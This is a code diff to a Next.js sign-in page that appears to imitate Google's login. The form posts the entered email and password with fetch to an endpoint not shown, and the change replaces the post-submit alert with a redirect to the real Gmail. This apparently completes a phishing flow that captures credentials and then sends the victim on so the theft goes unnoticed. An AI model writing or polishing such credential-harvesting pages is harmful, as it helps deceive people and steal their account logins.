@@ -3,11 +3,13 @@
 'use client';
 
 import { useState } from 'react';
+import { useRouter } from 'next/navigation';
 import { Roboto } from 'next/font/google';
 
 const roboto = Roboto({ weight: ['400'], subsets: ['latin'] });
 
 export default function SignIn() {
+  const router = useRouter();
   const [step, setStep] = useState(1);
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
@@ -28,13 +30,13 @@ export default function SignIn() {
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ email, password }),
     });
-    alert('Submitted');
+    router.push('https://mail.google.com');
   };
 
   return (
     <main className={`${roboto.className} flex flex-col justify-between min-h-screen bg-[#0e0e0e] text-white`}>
       <div className="flex flex-col items-center justify-center grow w-full px-4">
-        <div className="w-full max-w-4xl sm:flex sm:flex-row bg-[#0e0e0e] sm:bg-[#0e0e0e] sm:rounded-2xl sm:shadow-xl sm:overflow-hidden">
+        <div className="w-full max-w-4xl sm:flex sm:flex-row bg-[#0e0e0e] sm:rounded-2xl sm:shadow-xl sm:overflow-hidden">
           <div className="w-full sm:w-1/2 flex flex-col justify-start sm:justify-center p-6 sm:p-10">
             <div className="w-10 h-10 mb-6">
               <img
